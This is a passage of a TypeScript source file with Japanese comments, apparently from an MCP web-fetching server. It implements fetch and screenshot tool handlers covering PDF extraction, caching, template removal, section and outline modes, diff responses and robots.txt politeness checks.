    // "fresh"として表示する(HTML応答の"revalidated"相当だが、既存フォーマットは変更しない)。
    return [{ type: "text", text: formatPdfResponseFromCache(url, cached, maxTokens, page) }];
  }

  onProgress?.("PDFを解析しています…");
  const textResult = await extractPdfText(binary.bytes);

  if (textResult.hasTextLayer) {
    const markdown = markdownFromPdfText(textResult);
    cache.set({
      url,
      etag: binary.headers.get("etag"),
      lastModified: binary.headers.get("last-modified"),
      markdown,
      metadata: { title: textResult.title, finalUrl: binary.finalUrl, pdfPageCount: textResult.pageCount },
    });
    const paginated = paginateMarkdown(markdown, maxTokens, page);
    return [{ type: "text", text: formatPdfTextResponse(textResult.title, binary.finalUrl, "miss", textResult.pageCount, paginated) }];
  }

  // テキスト層が実質無い(スキャンPDF): 先頭ページから画像タイルとして返す(キャッシュ非対象)
  const images = await renderPdfPages(binary.bytes);
  const header = [
    `title: ${textResult.title ?? "(なし)"}`,
    `url: ${binary.finalUrl}`,
    `mode_used: screenshot`,
    `cache: miss`,
    `reason: PDFにテキスト層がありません(スキャンPDFの可能性。全${textResult.pageCount}ページ中先頭${images.length}ページを画像化)`,
    `tiles: ${images.length}`,
    `fetch_tier: pdf`,
  ].join("\n");
  return [
    { type: "text", text: header },
    ...images.map((image) => ({ type: "image" as const, data: image.png.toString("base64"), mimeType: "image/png" })),
  ];
}

// ---- fetchツール ----

export interface FetchToolInput {
  url: string;
  mode?: "auto" | "markdown" | "outline" | "screenshot" | undefined;
  selector?: string | undefined;
  section?: string | undefined;
  page?: number | undefined;
  max_tokens?: number | undefined;
  force_full?: boolean | undefined;
  /** MCP progress notifications用(server.tsがprogressToken有無に応じて組み立てて渡す。CLIは渡さない)。 */
  onProgress?: ((message: string) => void) | undefined;
}

// テスト用export(既存スタイルに合わせた最小のテスト可能化。politeness.guard呼び出し回数の検証用)。
export async function handleFetchTool(input: FetchToolInput): Promise<Array<TextBlock | ImageBlock>> {
  const mode = input.mode ?? "auto";
  const page = input.page ?? DEFAULT_PAGE;
  const maxTokens = input.max_tokens ?? DEFAULT_MAX_TOKENS;
  // 公開品質バグ修正: robots.txt取得(politeness.guard)より前にスキームを検証する(理由は
  // resolveScreenshotのコメント参照)。zodの.url()はスキームを制限しないため、ここでの
  // 検証が実質的な最初の関門になる。
  //
  // レビュー指摘対応: 以前はここで全mode共通の無条件politeness.guardを実行していたが、
  // キャッシュfresh応答(実ネットワークアクセスが発生しない)でも毎回レート制御の待機と
  // robots.txt再判定が走る自己ペナルティになっていた。guardは実際にサイトへ取得しに行く
  // 各経路(resolvePage/handlePdfFetch/resolveScreenshot)の内部で、必要な箇所にのみ
  // 個別に行う設計へ変更した(このファイル内の各所コメント参照)。
  assertHttpScheme(input.url);

  if (looksLikePdf(input.url, null)) {
    return handlePdfFetch(input.url, page, maxTokens, input.onProgress);
  }

  // 公開品質バグ修正: mode: screenshot(section未指定時)はMarkdown抽出結果を一切使わないため、
  // resolvePage(素のHTTP GETを含む二段フェッチ)を経由せずブラウザへ直行する。
  // 素のHTTPクライアントを拒否しブラウザは許可するサイト(例: initial.inc)に対して、
  // 「screenshotで再試行すると通る場合があります」というエラー提案がscreenshotモード自身の
  // HTTP前段GET失敗で行き止まりになっていた回帰の修正。screenshotツール本体は元々この経路を
  // 通らずブラウザ直行だったため、fetchツールのmode: screenshotもそれと同じ経路に揃える。
  if (mode === "screenshot" && !input.section) {
    const screenshot = await resolveScreenshot(input.url, {
      fullPage: true,
      width: DEFAULT_TILE_WIDTH,
      scale: DEFAULT_SCREENSHOT_SCALE,
      onProgress: input.onProgress,
    });
    return buildScreenshotContent({ title: null }, screenshot, null);
  }

  const resolvedOrHandoff = await resolvePage(input.url, input.selector, input.onProgress);

  // 機能B: 非HTMLコンテンツはMarkdown抽出・キャッシュ・mode/selector/section等を適用せず、
  // メタデータ+プレビュー+curl誘導のハンドオフ応答を返す(PDFのURL判定と同様の独立経路)。
  //
  // レビュー指摘対応: ただしcontent-typeでPDFと判明した場合(URL拡張子には現れない
  // 官公庁の`/download?id=123`型ダウンロードエンドポイント等)は、行き止まりのハンドオフ
  // 応答にせずhandlePdfFetch(既存のPDF専用経路)へ合流させる。関数冒頭のlooksLikePdf(input.url, null)
  // はURL拡張子で早期判明する場合の経路であり、ここはcontent-type確定後にのみ判明する
  // 場合の救済経路のため、拡張子ありのPDFが二重処理されることはない。
  if ("kind" in resolvedOrHandoff) {
    const { handoff } = resolvedOrHandoff;
    if (looksLikePdf(handoff.finalUrl, handoff.contentType)) {
      return handlePdfFetch(input.url, page, maxTokens, input.onProgress);
    }
    return [{ type: "text", text: formatHandoffResponse(handoff, maxTokens) }];
  }
  const resolved = resolvedOrHandoff;

  // Phase 4 テンプレート学習: 定型ブロック(ヘッダ/フッタ/定型ナビ等)を表示直前に除去する。
  // force_fullで無効化できる。selector指定時はページ全体ではなく特定要素の抽出結果なので対象外。
  const domain = safeHostname(resolved.finalUrl);
  const templateHashes = !input.force_full && !input.selector && domain ? cache.getTemplateBlockHashes(domain) : new Set<string>();
  const { markdown: displayMarkdown, removedCount: templateRemovedCount } = removeTemplateBlocks(resolved.markdown, templateHashes);
  const previousDisplayMarkdown =
    resolved.previousMarkdown !== null ? removeTemplateBlocks(resolved.previousMarkdown, templateHashes).markdown : null;
  const view: ResolvedPage = { ...resolved, markdown: displayMarkdown, previousMarkdown: previousDisplayMarkdown };

  // sectionが指定された場合は、mode指定に関わらずその節のMarkdownのみを返す(差分応答は適用しない)
  if (input.section) {
    const section = findSection(view.markdown, input.section);
    if (section === null) {
      throw new SectionNotFoundError(input.url, input.section);
    }
    const paginated = paginateMarkdown(section.content, maxTokens, page);
    const breadcrumb = formatBreadcrumb(section.ancestors);
    return [{ type: "text", text: formatMarkdownResponse(view, paginated, input.section, templateRemovedCount, breadcrumb) }];
  }

  if (mode === "outline") {
    const outline = buildOutline(view.markdown);
    return [{ type: "text", text: formatOutlineResponse(view, outline, templateRemovedCount) }];
  }

  // mode: screenshot(section未指定)はここに到達する前に早期returnしているため、
  // ここでのscreenshot切替はmode: autoの品質判定のみが対象になる。
  //
  // code-reviewer指摘: 以前はここでresolved.finalUrl(resolvePageのHTTPフェッチが辿った
  // リダイレクト後のURL)を渡しており、上のmode: screenshot早期return(input.urlを渡す)
  // とキャッシュキーの元になるURLが食い違っていた。リダイレクトのあるURLでは同一ページが
  // 二重に撮影・保存されてしまうため、両経路で必ずinput.urlを渡すよう統一する
  // (resolveScreenshot自身のブラウザナビゲーションが同じリダイレクトを辿るため実害は無い)。
  if (mode === "auto" && resolved.lowQuality) {
    // レビュー指摘対応: resolvePage内のmarkdown取得guardとは別の、screenshotナビゲーションの
    // ための独立したguardがresolveScreenshot内で行われる(=より正確な礼儀)。
    const screenshot = await resolveScreenshot(input.url, {
      fullPage: true,
      width: DEFAULT_TILE_WIDTH,
      scale: DEFAULT_SCREENSHOT_SCALE,
      onProgress: input.onProgress,
    });
    return buildScreenshotContent(resolved, screenshot, resolved.qualityReason);
  }

  // §3-3 差分応答: selector無し・force_full無し・新規フェッチ(cacheStatus==='miss')かつ旧キャッシュがある場合のみ
  // 比較にはview(テンプレート除去後)を使う。定型ブロックの有無で誤って差分検知しないようにするため。
  const diffEligible = !input.selector && !input.force_full && resolved.cacheStatus === "miss" && view.previousMarkdown !== null;
  if (diffEligible) {
    if (view.previousMarkdown === view.markdown) {
      return [{ type: "text", text: formatUnchangedResponse(view) }];
    }
    const diff = diffMarkdown(view.previousMarkdown ?? "", view.markdown);
    if (diff.sections.length > 0 && !diff.allSectionsChanged) {
      return [{ type: "text", text: formatDiffResponse(view, diff.sections, templateRemovedCount) }];
    }
    // 全節変更、または差分検出不能な場合は通常の全文応答へフォールバックする
  }

  const paginated = paginateMarkdown(view.markdown, maxTokens, page);
  return [{ type: "text", text: formatMarkdownResponse(view, paginated, null, templateRemovedCount) }];
}

// ---- screenshotツール ----

export interface ScreenshotToolInput {
  url: string;
  fullPage?: boolean | undefined;
  width?: number | undefined;
  scale?: number | undefined;
  /** MCP progress notifications用(server.tsがprogressToken有無に応じて組み立てて渡す)。 */
  onProgress?: ((message: string) => void) | undefined;
}

// テスト用export(既存スタイルに合わせた最小のテスト可能化。politeness.guard呼び出し回数の検証用)。
// 独立screenshotツールも含め、resolveScreenshotは常に自身でguardする。
export async function handleScreenshotTool(input: ScreenshotToolInput): Promise<Array<TextBlock | ImageBlock>> {
  const screenshot = await resolveScreenshot(input.url, {
    fullPage: input.fullPage ?? true,
    width: input.width ?? DEFAULT_TILE_WIDTH,
    scale: input.scale ?? DEFAULT_SCREENSHOT_SCALE,
    onProgress: input.onProgress,
  });
  return buildScreenshotContent({ title: null }, screenshot, null);
}
